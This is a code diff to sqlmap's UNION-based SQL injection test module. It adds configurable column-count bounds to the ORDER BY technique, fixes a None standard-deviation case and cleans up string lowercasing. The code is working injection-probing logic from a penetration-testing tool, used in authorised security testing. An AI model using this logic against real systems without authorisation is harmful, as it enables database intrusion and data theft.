@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
-See the file 'doc/COPYING' for copying permission
+Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
 """
 
 import logging
@@ -48,7 +48,7 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
     """
     retVal = None
 
-    def _orderByTechnique():
+    def _orderByTechnique(lowerCount, upperCount):
         def _orderByTest(cols):
             query = agent.prefixQuery("ORDER BY %d" % cols, prefix=prefix)
             query = agent.suffixQuery(query, suffix=suffix, comment=comment)
@@ -56,7 +56,7 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
             page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)
             return not any(re.search(_, page or "", re.I) and not re.search(_, kb.pageTemplate or "", re.I) for _ in ("(warning|error):", "order by", "unknown column", "failed")) and comparison(page, headers, code) or re.search(r"data types cannot be compared or sorted", page or "", re.I)
 
-        if _orderByTest(1) and not _orderByTest(randomInt()):
+        if _orderByTest(1 if lowerCount is None else lowerCount) and not _orderByTest(randomInt() if upperCount is None else upperCount + 1):
             infoMsg = "'ORDER BY' technique appears to be usable. "
             infoMsg += "This should reduce the time needed "
             infoMsg += "to find the right number "
@@ -64,10 +64,10 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
             infoMsg += "range for current UNION query injection technique test"
             singleTimeLogMessage(infoMsg)
 
-            lowCols, highCols = 1, ORDER_BY_STEP
+            lowCols, highCols = 1 if lowerCount is None else lowerCount, ORDER_BY_STEP if upperCount is None else upperCount
             found = None
             while not found:
-                if _orderByTest(highCols):
+                if not conf.uCols and _orderByTest(highCols):
                     lowCols = highCols
                     highCols += ORDER_BY_STEP
                 else:
@@ -88,8 +88,8 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
         kb.errorIsNone = False
         lowerCount, upperCount = conf.uColsStart, conf.uColsStop
 
-        if lowerCount == 1:
-            found = kb.orderByColumns or _orderByTechnique()
+        if lowerCount == 1 or conf.uCols:
+            found = kb.orderByColumns or _orderByTechnique(lowerCount, upperCount)
             if found:
                 kb.orderByColumns = found
                 infoMsg = "target URL appears to have %d column%s in query" % (found, 's' if found > 1 else "")
@@ -115,7 +115,7 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
 
         if not isNullValue(kb.uChar):
             for regex in (kb.uChar, r'>\s*%s\s*<' % kb.uChar):
-                contains = [(count, re.search(regex, _ or "", re.IGNORECASE) is not None) for count, _ in pages.items()]
+                contains = tuple((count, re.search(regex, _ or "", re.IGNORECASE) is not None) for count, _ in pages.items())
                 if len(filter(lambda _: _[1], contains)) == 1:
                     retVal = filter(lambda _: _[1], contains)[0][0]
                     break
@@ -142,14 +142,16 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
 
             elif abs(max_ - min_) >= MIN_STATISTICAL_RANGE:
                     deviation = stdev(ratios)
-                    lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation
 
-                    if min_ < lower:
-                        retVal = minItem[0]
+                    if deviation is not None:
+                        lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation
 
-                    if max_ > upper:
-                        if retVal is None or abs(max_ - upper) > abs(min_ - lower):
-                            retVal = maxItem[0]
+                        if min_ < lower:
+                            retVal = minItem[0]
+
+                        if max_ > upper:
+                            if retVal is None or abs(max_ - upper) > abs(min_ - lower):
+                                retVal = maxItem[0]
     finally:
         kb.errorIsNone = popValue()
 
@@ -178,7 +180,7 @@ def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLO
         for position in positions:
             # Prepare expression with delimiters
             randQuery = randomStr(charCount)
-            phrase = "%s%s%s".lower() % (kb.chars.start, randQuery, kb.chars.stop)
+            phrase = ("%s%s%s" % (kb.chars.start, randQuery, kb.chars.stop)).lower()
             randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
             randQueryUnescaped = unescaper.escape(randQueryProcessed)
 
@@ -188,9 +190,7 @@ def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLO
 
             # Perform the request
             page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
-            content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "", \
-                removeReflectiveValues(listToStrValue(headers.headers if headers else None), \
-                payload, True) or "")
+            content = ("%s%s" % (removeReflectiveValues(page, payload) or "", removeReflectiveValues(listToStrValue(headers.headers if headers else None), payload, True) or "")).lower()
 
             if content and phrase in content:
                 validPayload = payload
@@ -200,7 +200,7 @@ def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLO
                 if where == PAYLOAD.WHERE.ORIGINAL:
                     # Prepare expression with delimiters
                     randQuery2 = randomStr(charCount)
-                    phrase2 = "%s%s%s".lower() % (kb.chars.start, randQuery2, kb.chars.stop)
+                    phrase2 = ("%s%s%s" % (kb.chars.start, randQuery2, kb.chars.stop)).lower()
                     randQueryProcessed2 = agent.concatQuery("\'%s\'" % randQuery2)
                     randQueryUnescaped2 = unescaper.escape(randQueryProcessed2)
 
@@ -210,7 +210,7 @@ def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLO
 
                     # Perform the request
                     page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
-                    content = "%s%s".lower() % (page or "", listToStrValue(headers.headers if headers else None) or "")
+                    content = ("%s%s" % (page or "", listToStrValue(headers.headers if headers else None) or "")).lower()
 
                     if not all(_ in content for _ in (phrase, phrase2)):
                         vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True)
@@ -223,9 +223,7 @@ def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLO
 
                         # Perform the request
                         page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
-                        content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "", \
-                            removeReflectiveValues(listToStrValue(headers.headers if headers else None), \
-                            payload, True) or "")
+                        content = ("%s%s" % (removeReflectiveValues(page, payload) or "", removeReflectiveValues(listToStrValue(headers.headers if headers else None), payload, True) or "")).lower()
                         if content.count(phrase) > 0 and content.count(phrase) < LIMITED_ROWS_TEST_NUMBER:
                             warnMsg = "output with limited number of rows detected. Switching to partial mode"
                             logger.warn(warnMsg)
@@ -277,7 +275,7 @@ def _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
     if count:
         validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)
 
-        if not all([validPayload, vector]) and not all([conf.uChar, conf.dbms]):
+        if not all((validPayload, vector)) and not all((conf.uChar, conf.dbms)):
             warnMsg = "if UNION based SQL injection is not detected, "
             warnMsg += "please consider "
 
@@ -298,7 +296,7 @@ def _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
                     warnMsg += "forcing the "
                 warnMsg += "back-end DBMS (e.g. '--dbms=mysql') "
 
-            if not all([validPayload, vector]) and not warnMsg.endswith("consider "):
+            if not all((validPayload, vector)) and not warnMsg.endswith("consider "):
                 singleTimeWarnMessage(warnMsg)
 
     return validPayload, vector
